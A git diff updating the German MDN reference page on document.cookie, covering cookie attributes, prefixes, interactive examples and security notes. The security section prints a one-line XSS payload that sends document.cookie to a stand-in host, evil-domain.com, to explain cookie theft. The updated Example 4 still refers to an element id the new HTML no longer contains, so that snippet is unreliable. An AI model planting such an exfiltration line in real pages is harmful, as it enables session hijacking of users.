@@ -1,94 +1,83 @@
 ---
-title: "Dokument: cookie-Eigenschaft"
+title: "Dokument: Cookie-Eigenschaft"
 short-title: cookie
 slug: Web/API/Document/cookie
 l10n:
-  sourceCommit: f216422c99b6c7014e398803b70600501bce8a48
+  sourceCommit: 6328a1815cbcd59b279f0155f42435d8b0f9d296
 ---
 
 {{APIRef("DOM")}}
 
-Die [`Document`](/de/docs/Web/API/Document)-Eigenschaft `cookie` ermöglicht es Ihnen, die mit dem Dokument verbundenen [Cookies](/de/docs/Web/HTTP/Cookies) zu lesen und zu schreiben.
-Sie dient als Getter und Setter für die tatsächlichen Werte der Cookies.
+Die [`Document`](/de/docs/Web/API/Document)-Eigenschaft `cookie` ermöglicht das Lesen und Schreiben von [Cookies](/de/docs/Web/HTTP/Guides/Cookies), die mit dem Dokument assoziiert sind. Sie dient als Getter und Setter für die tatsächlichen Werte der Cookies.
 
-## Syntax
+> [!NOTE]
+> `document.cookie` kann eine Quelle von Leistungsproblemen sein, da es sich um eine synchrone API handelt und den Haupt-Thread blockiert, wenn Cookies über Prozesse hinweg gelesen oder I/O-Operationen ausgeführt werden. Entwickler sollten, wenn möglich, die asynchrone [Cookie Store API](/de/docs/Web/API/Cookie_Store_API) verwenden, um Cookies zu verwalten.
 
-### Alle zugänglichen Cookies von diesem Ort aus lesen
+## Wert
 
-```js
-allCookies = document.cookie;
-```
+Ein String, der eine durch Semikolon getrennte Liste aller Cookies enthält (d.h. `key=value`-Paare). Beachten Sie, dass jeder _key_ und _value_ von Leerzeichen (Leerzeichen- und Tabulatorzeichen) umgeben sein kann: Tatsächlich fordert {{RFC(6265)}} ein einzelnes Leerzeichen nach jedem Semikolon, aber einige Benutzeragenten halten sich möglicherweise nicht daran.
 
-Im obigen Code ist `allCookies` eine Zeichenkette, die eine durch Semikolons getrennte Liste aller Cookies (d. h. `key=value`-Paare) enthält.
-Beachten Sie, dass jeder _key_ und _value_ von Leerzeichen (Leer- und Tabulatorzeichen) umgeben sein kann: Tatsächlich verlangt {{RFC(6265)}} ein einzelnes Leerzeichen nach jedem Semikolon, aber einige User Agents halten sich möglicherweise nicht daran.
+Sie können dieser Eigenschaft auch einen String der Form `"key=value"` zuweisen, der das zu setzende/aktualisierende Cookie angibt. Beachten Sie, dass Sie mit dieser Methode nur ein einzelnes Cookie auf einmal setzen/aktualisieren können. Beachten Sie auch, dass:
 
-### Ein neues Cookie schreiben
-
-```js
-document.cookie = newCookie;
-```
-
-Im obigen Code ist `newCookie` eine Zeichenkette in der Form `key=value`, die das zu setzende/aktualisierende Cookie angibt. Beachten Sie, dass Sie mit dieser Methode immer nur ein einzelnes Cookie gleichzeitig setzen/aktualisieren können. Beachten Sie auch, dass:
-
-- Jedes der folgenden Cookie-Attributwerte kann optional auf das Schlüssel-Wert-Paar folgen, jeweils durch ein Semikolon getrennt:
-
-  - `;domain=domain` (z. B. `example.com` oder `subdomain.example.com`): Der Host, an den das Cookie gesendet wird.
-    Wird kein Host angegeben, wird dies standardmäßig auf den Hostanteil der aktuellen Dokumenten-Location gesetzt und das Cookie ist auf Subdomains nicht verfügbar.
-    Wenn ein Domainname angegeben ist, sind Subdomains immer eingeschlossen.
-    Entgegen früherer Spezifikationen werden führende Punkte in Domainnamen ignoriert, aber Browser könnten es ablehnen, das Cookie mit solchen Punkten zu setzen.
+- Jeder der folgenden Cookie-Attributwerte dem Schlüssel-Wert-Paar folgen kann, jeweils durch ein Semikolon getrennt:
+  - `;domain=domain` (zum Beispiel `example.com` oder `subdomain.example.com`): Der Host, an den das Cookie gesendet wird. Wenn nicht angegeben, ist dies standardmäßig der Hostteil der aktuellen Dokument-URL, und das Cookie ist nicht für Subdomains verfügbar. Wenn eine Domain angegeben ist, sind Subdomains immer eingeschlossen. Im Gegensatz zu früheren Spezifikationen werden führende Punkte in Domänennamen ignoriert, aber Browser können ablehnen, das Cookie zu setzen, das solche Punkte enthält.
 
     > [!NOTE]
-    > Die Domain _muss_ mit der Domain des JavaScript-Ursprungs übereinstimmen.
-    > Das Setzen von Cookies auf fremde Domains wird stillschweigend ignoriert.
+    > Die Domain _muss_ mit der Domain des JavaScript-Ursprungs übereinstimmen. Das Setzen von Cookies für fremde Domains wird stillschweigend ignoriert.
 
-  - `;expires=date-in-UTCString-format`: Das Ablaufdatum des Cookies. Wenn weder `expires` noch `max-age` angegeben ist, wird es am Ende der Sitzung ablaufen.
+  - `;expires=date-in-UTCString-format`: Das Ablaufdatum des Cookies. Wenn weder `expires` noch `max-age` angegeben wird, läuft es am Ende der Sitzung ab.
 
     > [!WARNING]
-    > Wenn der Schutz der Privatsphäre der Nutzer von Bedeutung ist, ist es wichtig, dass jede Webanwendung die Cookie-Daten nach einer bestimmten Zeitspanne ungültig macht, anstatt sich auf den Browser zu verlassen.
-    > Viele Browser erlauben es Nutzern, festzulegen, dass Cookies niemals ablaufen sollen, was nicht unbedingt sicher ist.
+    > Wenn die Privatsphäre der Benutzer ein Anliegen ist, ist es wichtig, dass jede Web-App-Implementierung Cookie-Daten nach einer bestimmten Zeitspanne ungültig macht, anstatt sich auf den Browser zu verlassen. Viele Browser erlauben es Benutzern anzugeben, dass Cookies niemals ablaufen sollen, was nicht unbedingt sicher ist.
 
-    Siehe {{jsxref("Date.toUTCString()")}} zur Unterstützung der Formatierung dieses Werts.
+    Siehe {{jsxref("Date.toUTCString()")}} für Hilfe beim Formatieren dieses Wertes.
 
-  - `;max-age=max-age-in-seconds`: Die maximale Lebenszeit des Cookies in Sekunden (z. B. `60*60*24*365` oder 31536000 für ein Jahr).
+  - `;max-age=max-age-in-seconds`: Das maximale Alter des Cookies in Sekunden (z.B. `60*60*24*365` oder 31536000 für ein Jahr).
 
-  - `;partitioned`: Gibt an, dass das Cookie mit partitioniertem Speicher gespeichert werden soll. Siehe [Cookies Having Independent Partitioned State (CHIPS)](/de/docs/Web/Privacy/Privacy_sandbox/Partitioned_cookies) für weitere Details.
+  - `;partitioned`: Gibt an, dass das Cookie unter Verwendung von partitioniertem Speicher gespeichert werden sollte. Siehe [Cookies Having Independent Partitioned State (CHIPS)](/de/docs/Web/Privacy/Guides/Privacy_sandbox/Partitioned_cookies) für weitere Details.
 
-  - `;path=path`: Der Wert des `Path`-Attributs des Cookies (siehe [Definieren, wohin Cookies gesendet werden](/de/docs/Web/HTTP/Cookies#define_where_cookies_are_sent) für weitere Informationen).
+  - `;path=path`: Der Wert des `Path`-Attributs des Cookies (siehe [Define where cookies are sent](/de/docs/Web/HTTP/Guides/Cookies#define_where_cookies_are_sent) für weitere Informationen).
 
-  - `;samesite`: Das `SameSite`-Attribut eines {{httpheader("Set-Cookie")}}-Headers kann von einem Server gesetzt werden, um zu spezifizieren, wann das Cookie gesendet wird. Mögliche Werte sind `lax`, `strict` oder `none` (siehe auch [Steuerung von Drittanbieter-Cookies mit `SameSite`](/de/docs/Web/HTTP/Cookies#controlling_third-party_cookies_with_samesite)).
+  - `;samesite`: Das `SameSite`-Attribut eines {{httpheader("Set-Cookie")}}-Headers kann von einem Server gesetzt werden, um anzugeben, wann das Cookie gesendet wird. Mögliche Werte sind `lax`, `strict` oder `none` (siehe auch [Controlling third-party cookies with `SameSite`](/de/docs/Web/HTTP/Guides/Cookies#controlling_third-party_cookies_with_samesite)).
+    - Der Wert `lax` sendet das Cookie für alle gleichseitigen Anfragen und GET-Anfragen bei Navigationen auf oberster Ebene. Dies ist ausreichend für Benutzertracking, verhindert jedoch viele {{Glossary("CSRF", "Cross-Site Request Forgery")}} (CSRF)-Angriffe. Dies ist der Standardwert in modernen Browsern.
+    - Der Wert `strict` verhindert, dass das Cookie von dem Browser an die Zielseite in allen fremden Browsing-Kontexten gesendet wird, selbst wenn ein regulärer Link gefolgt wird.
+    - Der Wert `none` gibt explizit an, dass keine Einschränkungen angewendet werden. Das Cookie wird in allen Anfragen gesendet - sowohl fremdseitig als auch gleichseitig.
 
-    - Der Wert `lax` sendet das Cookie für alle Same-Site-Anfragen und top-level Navigations-GET-Anfragen.
-      Dies ist ausreichend für Benutzertracking, verhindert jedoch viele {{Glossary("CSRF", "Cross-Site Request Forgery")}} (CSRF)-Angriffe.
-      Dies ist der Standardwert in modernen Browsern.
-    - Der Wert `strict` verhindert, dass das Cookie vom Browser an die Zielseite in allen Cross-Site-Browsing-Kontexten gesendet wird, selbst beim Folgen eines normalen Links.
-    - Der Wert `none` besagt ausdrücklich, dass keine Einschränkungen gelten.
-      Das Cookie wird in allen Anfragen gesendet - sowohl cross-site als auch same-site.
+  - `;secure`: Gibt an, dass das Cookie nur über ein sicheres Protokoll übertragen werden sollte.
 
-  - `;secure`: Gibt an, dass das Cookie nur über ein sicheres Protokoll gesendet werden soll.
-
-- Die Cookie-Wert-Zeichenkette kann {{jsxref("Global_Objects/encodeURIComponent", "encodeURIComponent()")}} verwenden, um sicherzustellen, dass die Zeichenkette keine Kommas, Semikolons oder Leerzeichen enthält (die in Cookie-Werten nicht erlaubt sind).
-- Einige User Agent Implementierungen unterstützen die folgenden Cookie-Präfixe:
-
-  - `__Secure-` Signalisiert dem Browser, dass er das Cookie nur in Anfragen einfügen soll, die über einen sicheren Kanal übertragen werden.
-  - `__Host-` Signalisiert dem Browser, dass zusätzlich zur Einschränkung, das Cookie nur von einem sicheren Ursprung zu nutzen, der Geltungsbereich des Cookies auf ein vom Server weitergegebenes Path-Attribut beschränkt ist.
-    Wenn der Server das Path-Attribut weglässt, wird das "Verzeichnis" der Anforderungs-URI verwendet.
-    Es signalisiert auch, dass das Domain-Attribut nicht vorhanden sein darf, was verhindert, dass das Cookie an andere Domains gesendet wird.
-    Für Chrome muss das Path-Attribut immer der Ursprung sein.
+- Der Cookie-Werte-String kann {{jsxref("Global_Objects/encodeURIComponent", "encodeURIComponent()")}} verwenden, um sicherzustellen, dass der String keine Kommas, Semikolons oder Leerzeichen enthält (die in Cookie-Werten nicht erlaubt sind).
+- Der Cookie-Name kann ein Präfix haben, das bestimmte Einschränkungen für die Attribute des Cookies in unterstützenden Benutzeragenten auferlegt. Alle Cookie-Präfixe beginnen mit einem Doppel-Unterstrich (`__`) und enden mit einem Bindestrich (`-`). Die folgenden Präfixe sind definiert:
+  - **`__Secure-`**: Cookies mit Namen, die mit `__Secure-` beginnen, müssen mit dem `Secure`-Attribut von einer sicheren Seite (HTTPS) gesetzt werden.
+  - **`__Host-`**: Cookies mit Namen, die mit `__Host-` beginnen, müssen mit dem `Secure`-Attribut von einer sicheren Seite (HTTPS) gesetzt werden. Zusätzlich dürfen sie kein `Domain`-Attribut spezifiziert haben und das `Path`-Attribut muss auf `/` gesetzt sein. Dies garantiert, dass solche Cookies nur an den Host gesendet werden, der sie gesetzt hat und nicht an einen anderen Host unter der Domain. Es garantiert auch, dass sie hostweit gesetzt sind und auf keinem Pfad auf diesem Host überschrieben werden können. Diese Kombination ergibt ein Cookie, das der Behandlung des Ursprungs als Sicherheitsgrenze so nahe wie möglich kommt.
+  - **`__Http-`**: Cookies mit Namen, die mit `__Http-` beginnen, müssen mit dem `Secure`-Flag von einer sicheren Seite (HTTPS) gesetzt werden und zusätzlich muss das `HttpOnly`-Attribut gesetzt sein, um zu beweisen, dass sie über den `Set-Cookie`-Header gesetzt wurden (sie können nicht über JavaScript-Funktionen wie `Document.cookie` oder die [Cookie Store API](/de/docs/Web/API/Cookie_Store_API) gesetzt oder geändert werden).
+  - **`__Host-Http-`**: Cookies mit Namen, die mit `__Host-Http-` beginnen, müssen mit dem `Secure`-Flag von einer sicheren Seite (HTTPS) gesetzt werden und das `HttpOnly`-Attribut muss gesetzt sein, um zu beweisen, dass sie über den `Set-Cookie`-Header gesetzt wurden. Zusätzlich haben sie die gleichen Einschränkungen wie `__Host-`-präfixierte Cookies. Diese Kombination ergibt ein Cookie, das der Behandlung des Ursprungs als Sicherheitsgrenze so nahe wie möglich kommt, während gleichzeitig sichergestellt wird, dass Entwickler und Server-Betreiber wissen, dass sein Umfang auf HTTP-Anfragen beschränkt ist.
 
   > [!NOTE]
   > Der Bindestrich wird als Teil des Präfixes betrachtet.
 
   > [!NOTE]
-  > Diese Flags können nur mit dem `secure`-Attribut gesetzt werden.
+  > Diese Flags sind nur mit dem `secure`-Attribut setzbar.
 
 > [!NOTE]
-> Wie aus dem obigen Code ersichtlich ist, ist `document.cookie` eine [Zugriffseigenschaft](/de/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#description) mit native _setter_- und _getter_-Funktionen und folglich _kein_ [Dateneigenschaft](/de/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#description) mit einem Wert: Was Sie schreiben, ist nicht dasselbe wie das, was Sie lesen; alles wird immer vom JavaScript-Interpreter vermittelt.
+> Die `document.cookie`-Eigenschaft ist eine [Accessor-Eigenschaft](/de/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#description) mit nativen _Setter_- und _Getter_-Funktionen und ist daher _keine_ [Daten-Eigenschaft](/de/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#description) mit einem Wert: Was Sie schreiben, ist nicht dasselbe wie das, was Sie lesen; alles wird immer vom JavaScript-Interpreter vermittelt.
 
 ## Beispiele
 
-### Beispiel 1: Einfache Nutzung
+### Beispiel 1: Einfache Verwendung
+
+```html
+<button id="show">Show cookies</button>
+<button id="clear">Clear</button>
+<div>
+  <code id="cookie-value"></code>
+</div>
+```
 
 ```js
+const showBtn = document.getElementById("show");
+const clearBtn = document.getElementById("clear");
+const output = document.getElementById("cookie-value");
+
 // Note that we are setting `SameSite=None;` in this example because the example
 // needs to work cross-origin.
 // It is more common not to set the `SameSite` attribute, which results in the default,
@@ -96,32 +85,31 @@ Im obigen Code ist `newCookie` eine Zeichenkette in der Form `key=value`, die da
 document.cookie = "name=Oeschger; SameSite=None; Secure";
 document.cookie = "favorite_food=tripe; SameSite=None; Secure";
 
-function showCookies() {
-  const output = document.getElementById("cookies");
+showBtn.addEventListener("click", () => {
   output.textContent = `> ${document.cookie}`;
-}
-
-function clearOutputCookies() {
-  const output = document.getElementById("cookies");
+});
+clearBtn.addEventListener("click", () => {
   output.textContent = "";
-}
-```
-
-```html
-<button onclick="showCookies()">Show cookies</button>
-
-<button onclick="clearOutputCookies()">Clear</button>
-
-<div>
-  <code id="cookies"></code>
-</div>
+});
 ```
 
 {{EmbedLiveSample('Example_1_Simple_usage', 200, 72)}}
 
 ### Beispiel 2: Ein Beispiel-Cookie namens test2 abrufen
 
+```html
+<button id="show">Show cookie value</button>
+<button id="clear">Clear</button>
+<div>
+  <code id="cookie-value"></code>
+</div>
+```
+
 ```js
+const showBtn = document.getElementById("show");
+const clearBtn = document.getElementById("clear");
+const output = document.getElementById("cookie-value");
+
 // Note that we are setting `SameSite=None;` in this example because the example
 // needs to work cross-origin.
 // It is more common not to set the `SameSite` attribute, which results in the default,
@@ -129,41 +117,39 @@ function clearOutputCookies() {
 document.cookie = "test1=Hello; SameSite=None; Secure";
 document.cookie = "test2=World; SameSite=None; Secure";
 
-const cookieValue = document.cookie
-  .split("; ")
-  .find((row) => row.startsWith("test2="))
-  ?.split("=")[1];
-
-function showCookieValue() {
-  const output = document.getElementById("cookie-value");
+showBtn.addEventListener("click", () => {
+  const cookieValue = document.cookie
+    .split("; ")
+    .find((row) => row.startsWith("test2="))
+    ?.split("=")[1];
   output.textContent = `> ${cookieValue}`;
-}
-
-function clearOutputCookieValue() {
-  const output = document.getElementById("cookie-value");
+});
+clearBtn.addEventListener("click", () => {
   output.textContent = "";
-}
-```
-
-```html
-<button onclick="showCookieValue()">Show cookie value</button>
-
-<button onclick="clearOutputCookieValue()">Clear</button>
-
-<div>
-  <code id="cookie-value"></code>
-</div>
+});
 ```
 
 {{EmbedLiveSample('Example_2_Get_a_sample_cookie_named_test2', 200, 72)}}
 
-### Beispiel 3: Etwas nur einmal ausführen
+### Beispiel 3: Etwas nur einmal tun
 
 Um den folgenden Code zu verwenden, ersetzen Sie bitte alle Vorkommen des Wortes
 `doSomethingOnlyOnce` (den Namen des Cookies) durch einen benutzerdefinierten Namen.
 
+```html
+<button id="do-once">Only do something once</button>
+<button id="clear">Clear</button>
+<div>
+  <code id="output"></code>
+</div>
+```
+
 ```js
-function doOnce() {
+const doOnceBtn = document.getElementById("do-once");
+const clearBtn = document.getElementById("clear");
+const output = document.getElementById("output");
+
+doOnceBtn.addEventListener("click", () => {
   if (
     !document.cookie
       .split("; ")
@@ -176,33 +162,32 @@ function doOnce() {
     document.cookie =
       "doSomethingOnlyOnce=true; expires=Fri, 31 Dec 9999 23:59:59 GMT; SameSite=None; Secure";
 
-    const output = document.getElementById("do-once");
     output.textContent = "> Do something here!";
   }
-}
-
-function clearOutputDoOnce() {
-  const output = document.getElementById("do-once");
+});
+clearBtn.addEventListener("click", () => {
   output.textContent = "";
-}
-```
-
-```html
-<button onclick="doOnce()">Only do something once</button>
-
-<button onclick="clearOutputDoOnce()">Clear</button>
-
-<div>
-  <code id="do-once"></code>
-</div>
+});
 ```
 
 {{EmbedLiveSample('Example_3_Do_something_only_once', 200, 72)}}
 
 ### Beispiel 4: Das vorherige Cookie zurücksetzen
 
+```html
+<button id="reset">Reset only once cookie</button>
+<button id="clear">Clear</button>
+<div>
+  <code id="output"></code>
+</div>
+```
+
 ```js
-function resetOnce() {
+const resetBtn = document.getElementById("reset");
+const clearBtn = document.getElementById("clear");
+const output = document.getElementById("output");
+
+resetBtn.addEventListener("click", () => {
   // Note that we are setting `SameSite=None;` in this example because the example
   // needs to work cross-origin.
   // It is more common not to set the `SameSite` attribute, which results in the default,
@@ -212,140 +197,118 @@ function resetOnce() {
 
   const output = document.getElementById("reset-once");
   output.textContent = "> Reset!";
-}
-
-function clearOutputResetOnce() {
-  const output = document.getElementById("reset-once");
+});
+clearBtn.addEventListener("click", () => {
   output.textContent = "";
-}
-```
-
-```html
-<button onclick="resetOnce()">Reset only once cookie</button>
-
-<button onclick="clearOutputResetOnce()">Clear</button>
-
-<div>
-  <code id="reset-once"></code>
-</div>
+});
 ```
 
 {{EmbedLiveSample('Example_4_Reset_the_previous_cookie', 200, 72)}}
 
-### Beispiel 5: Die Existenz eines Cookies überprüfen
+### Beispiel 5: Überprüfen, ob ein Cookie existiert
+
+```html
+<button id="check">Check a cookie exists</button>
+<button id="clear">Clear</button>
+<div>
+  <code id="output"></code>
+</div>
+```
 
 ```js
+const checkBtn = document.getElementById("check");
+const clearBtn = document.getElementById("clear");
+const output = document.getElementById("output");
+
 // Note that we are setting `SameSite=None;` in this example because the example
 // needs to work cross-origin.
 // It is more common not to set the `SameSite` attribute, which results in the default,
 // and more secure, value of `SameSite=Lax;`
 document.cookie = "reader=1; SameSite=None; Secure";
 
-function checkACookieExists() {
+checkBtn.addEventListener("click", () => {
   if (
     document.cookie.split(";").some((item) => item.trim().startsWith("reader="))
   ) {
-    const output = document.getElementById("a-cookie-existence");
     output.textContent = '> The cookie "reader" exists';
+  } else {
+    output.textContent = '> The cookie "reader" does not exist';
   }
-}
-
-function clearOutputACookieExists() {
-  const output = document.getElementById("a-cookie-existence");
+});
+clearBtn.addEventListener("click", () => {
   output.textContent = "";
-}
-```
-
-```html
-<button onclick="checkACookieExists()">Check a cookie exists</button>
-
-<button onclick="clearOutputACookieExists()">Clear</button>
-
-<div>
-  <code id="a-cookie-existence"></code>
-</div>
+});
 ```
 
 {{EmbedLiveSample('Example_5_Check_a_cookie_existence', 200, 72)}}
 
 ### Beispiel 6: Überprüfen, ob ein Cookie einen bestimmten Wert hat
 
-```js
-function checkCookieHasASpecificValue() {
-  if (document.cookie.split(";").some((item) => item.includes("reader=1"))) {
-    const output = document.getElementById("a-specific-value-of-the-cookie");
-    output.textContent = '> The cookie "reader" has a value of "1"';
-  }
-}
-
-function clearASpecificValueOfTheCookie() {
-  const output = document.getElementById("a-specific-value-of-the-cookie");
-  output.textContent = "";
-}
+```html
+<button id="check">Check that a cookie has a specific value</button>
+<button id="clear">Clear</button>
+<div>
+  <code id="output"></code>
+</div>
 ```
 
-```html
-<button onclick="checkCookieHasASpecificValue()">
-  Check that a cookie has a specific value
-</button>
+```js
+const checkBtn = document.getElementById("check");
+const clearBtn = document.getElementById("clear");
+const output = document.getElementById("output");
 
-<button onclick="clearASpecificValueOfTheCookie()">Clear</button>
-
-<div>
-  <code id="a-specific-value-of-the-cookie"></code>
-</div>
+checkBtn.addEventListener("click", () => {
+  if (document.cookie.split(";").some((item) => item.includes("reader=1"))) {
+    output.textContent = '> The cookie "reader" has a value of "1"';
+  }
+});
+clearBtn.addEventListener("click", () => {
+  output.textContent = "";
+});
 ```
 
 {{EmbedLiveSample('Example_6_Check_that_a_cookie_has_a_specific_value', 200, 72)}}
 
 ## Sicherheit
 
-Es ist wichtig zu beachten, dass das `path`-Attribut _nicht_ vor unbefugtem Lesen des Cookies von einem anderen Pfad schützt.
-Es kann leicht mit dem DOM umgangen werden, zum Beispiel durch Erstellen eines versteckten {{HTMLElement("iframe")}}-Elements mit dem Pfad des Cookies und anschließendem Zugriff auf die `contentDocument.cookie`-Eigenschaft dieses iframes.
-Der einzige Weg, das Cookie zu schützen, besteht darin, eine andere Domain oder Subdomain zu verwenden, aufgrund der [Same-Origin-Policy](/de/docs/Web/Security/Same-origin_policy).
+Es ist wichtig zu beachten, dass das `path`-Attribut _nicht_ vor unbefugtem Lesen des Cookies aus einem anderen Pfad schützt. Es kann leicht umgangen werden, indem das DOM verwendet wird, zum Beispiel durch das Erstellen eines versteckten {{HTMLElement("iframe")}}-Elements mit dem Pfad des Cookies und dann Zugriff auf die `contentDocument.cookie`-Eigenschaft dieses Iframes. Der einzige Weg, um das Cookie zu schützen, besteht darin, eine andere Domain oder Subdomain zu verwenden, aufgrund der [Same-Origin-Policy](/de/docs/Web/Security/Same-origin_policy).
 
-Cookies werden häufig in Webanwendungen verwendet, um einen Benutzer und seine authentifizierte Sitzung zu identifizieren.
-Das Stehlen eines Cookies aus einer Webanwendung führt zum Hijacking der authentifizierten Sitzung des Benutzers.
-Gängige Methoden, um Cookies zu stehlen, sind der Einsatz von [Social Engineering](<https://en.wikipedia.org/wiki/Social_engineering_(security)>) oder das Ausnutzen einer {{Glossary("Cross-site_scripting", "Cross-Site-Scripting")}} (XSS) Schwachstelle in der Anwendung -
+Cookies werden in Web-Anwendungen häufig verwendet, um einen Benutzer und seine authentifizierte Sitzung zu identifizieren. Das Stehlen eines Cookies von einer Web-Anwendung führt zur Übernahme der authentifizierten Benutzersitzung. Häufige Methoden zum Stehlen von Cookies umfassen die Verwendung von [Social Engineering](<https://en.wikipedia.org/wiki/Social_engineering_(security)>) oder das Ausnutzen einer {{Glossary("Cross-site_scripting", "Cross-Site-Scripting")}} (XSS)-Schwachstelle in der Anwendung -
 
 ```js
 new Image().src = `http://www.evil-domain.com/steal-cookie.php?cookie=${document.cookie}`;
 ```
 
-Das `HTTPOnly`-Cookie-Attribut kann helfen, diesen Angriff zu mildern, indem verhindert wird, dass der Cookie-Wert über JavaScript zugänglich ist.
-Lesen Sie mehr über [Cookies und Sicherheit](https://humanwhocodes.com/blog/2009/05/12/cookies-and-security/).
+Das `HTTPOnly`-Cookie-Attribut kann helfen, diesen Angriff zu mildern, indem der Zugriff auf den Cookie-Wert durch JavaScript verhindert wird. Lesen Sie mehr über [Cookies und Sicherheit](https://humanwhocodes.com/blog/2009/05/12/cookies-and-security/).
 
 ## Anmerkungen
 
-- Ab Firefox 2 ist ein besserer Mechanismus für die clientseitige Speicherung verfügbar - [WHATWG DOM Storage](/de/docs/Web/API/Web_Storage_API).
+- Ab Firefox 2 steht ein besserer Mechanismus für die clientseitige Speicherung zur Verfügung - [WHATWG DOM Storage](/de/docs/Web/API/Web_Storage_API).
 - Sie können ein Cookie löschen, indem Sie seine Ablaufzeit auf null setzen.
-- Beachten Sie, dass je mehr Cookies Sie haben, desto mehr Daten zwischen dem Server und dem Client für jede Anfrage übertragen werden.
-  Dies wird jede Anfrage verlangsamen.
-  Es wird dringend empfohlen, [WHATWG DOM Storage](/de/docs/Web/API/Web_Storage_API) zu verwenden, wenn Sie "client-only" Daten speichern möchten.
-- [RFC 2965](https://datatracker.ietf.org/doc/html/rfc2965) (Abschnitt 5.3, "Implementierungsgrenzen") gibt an, dass es **keine maximale Länge** für die Größe von Schlüssel oder Wert eines Cookies geben sollte und ermutigt Implementierungen, **beliebig große Cookies** zu unterstützen.
-  Die maximale Implementierung variiert zwangsläufig zwischen den Browsern, konsultieren Sie daher die einzelnen Browser-Dokumentationen.
+- Bedenken Sie, dass je mehr Cookies Sie haben, desto mehr Daten werden zwischen dem Server und dem Client für jede Anfrage übertragen. Dies wird jede Anfrage langsamer machen. Es wird unbedingt empfohlen, [WHATWG DOM Storage](/de/docs/Web/API/Web_Storage_API) zu verwenden, wenn Sie "client-only"-Daten speichern möchten.
+- [RFC 2965](https://datatracker.ietf.org/doc/html/rfc2965) (Abschnitt 5.3, "Implementation Limits") gibt an, dass es **keine maximale Länge** für die Größe eines Cookie-Schlüssels oder -Werts geben sollte und ermutigt Implementierungen, **beliebig große Cookies** zu unterstützen. Das Maximum jeder Browser-Implementierung wird zwangsläufig unterschiedlich sein, daher konsultieren Sie die individuelle Browser-Dokumentation.
 
-Der Grund für die [Syntax](#syntax) der `document.cookie` Zugriffseigenschaft liegt in der Client-Server-Natur von Cookies, die sich von anderen Client-Client-Speichermethoden unterscheidet (wie zum Beispiel [localStorage](/de/docs/Web/API/Web_Storage_API)):
+Der Grund für die Asymmetrie zwischen dem Abrufen und Setzen der `document.cookie`-Accessor-Eigenschaft liegt in der Client-Server-Natur von Cookies, die sich von anderen Client-Client-Speichermethoden (wie beispielsweise [localStorage](/de/docs/Web/API/Web_Storage_API)) unterscheidet:
 
-### Der Server weist den Client an, ein Cookie zu speichern
+- Der Server sagt dem Client, dass er ein Cookie speichern soll:
 
-```bash
-HTTP/1.0 200 OK
-Content-type: text/html
-Set-Cookie: cookie_name1=cookie_value1
-Set-Cookie: cookie_name2=cookie_value2; expires=Sun, 16 Jul 3567 06:23:41 GMT
+  ```http
+  HTTP/1.0 200 OK
+  Content-type: text/html
+  Set-Cookie: cookie_name1=cookie_value1
+  Set-Cookie: cookie_name2=cookie_value2; expires=Sun, 16 Jul 3567 06:23:41 GMT
 
-[content of the page here]
-```
+  [content of the page here]
+  ```
 
-### Der Client sendet dem Server die zuvor gespeicherten Cookies zurück
+- Der Client sendet die zuvor gespeicherten Cookies zurück an den Server:
 
-```bash
-GET /sample_page.html HTTP/1.1
-Host: www.example.org
-Cookie: cookie_name1=cookie_value1; cookie_name2=cookie_value2
-Accept: */*
-```
+  ```http
+  GET /sample_page.html HTTP/1.1
+  Host: www.example.org
+  Cookie: cookie_name1=cookie_value1; cookie_name2=cookie_value2
+  Accept: */*
+  ```
 
 ## Spezifikationen
 
@@ -357,8 +320,8 @@ Accept: */*
 
 ## Siehe auch
 
-- [HTTP-Cookies](/de/docs/Web/HTTP/Cookies)
-- [DOM-Speicher](/de/docs/Web/API/Web_Storage_API)
+- [HTTP-Cookies](/de/docs/Web/HTTP/Guides/Cookies)
+- [DOM-Speicherung](/de/docs/Web/API/Web_Storage_API)
 - [`URL.pathname`](/de/docs/Web/API/URL/pathname)
 - {{jsxref("Date.toUTCString()")}}
 - [RFC 2965](https://datatracker.ietf.org/doc/html/rfc2965)
